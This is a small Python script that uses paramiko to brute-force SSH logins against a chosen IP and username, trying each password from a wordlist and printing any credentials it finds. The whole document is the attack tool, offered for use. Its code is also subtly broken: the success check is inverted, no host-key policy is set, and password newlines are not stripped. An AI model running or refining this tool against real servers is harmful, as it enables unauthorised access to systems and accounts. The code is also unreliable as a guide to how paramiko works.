import paramiko
import argparse

NOT_CONNECTED = 0
CONNECTED = 1

#Open and read files containing passwords
def load_passwords(passwords_input_file):
    password_list = []

    with open(passwords_input_file, 'r') as passwords_input_list:
        file_lines = passwords_input_list.readlines()
        for line in file_lines:
            password_list.append(line)

    return password_list


#Open connection to SSH server
def attempt_connection(ssh_client, attempt_ip, attempt_password, attempt_username):
    attempt_result = ssh_client.connect(hostname=attempt_ip, 
                                        port=22,
                                        password=attempt_password,
                                        username=attempt_username)
    if attempt_result == None:
        print(f"[-] Failed attempt! Username: {attempt_username} Password: {attempt_password}")
        return NOT_CONNECTED
    else:
        print(f"[+] Found valid credentials! Username: {attempt_username} Password: {attempt_password}")
        return CONNECTED


#Start cycling through password list and attempt combination with provided user
#Have to add username list functionality here.
def cycle_list(ssh_client, attempt_ip, attempt_password_list, attempt_username):

    for password in attempt_password_list:
        if attempt_connection(ssh_client, attempt_ip, password, attempt_username) == CONNECTED:
            break
        
def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", help="IP to connect to")
    parser.add_argument("-iL", "--file", help="File with passswords")
    parser.add_argument("-u", "--user", help="Username")

    args = parser.parse_args()
    variables = vars(args)

    ssh_client = paramiko.SSHClient()
    passwords = load_passwords(variables['file'])
    cycle_list(ssh_client, variables['ip'], passwords, variables['user'])  


if __name__ == '__main__':
    main()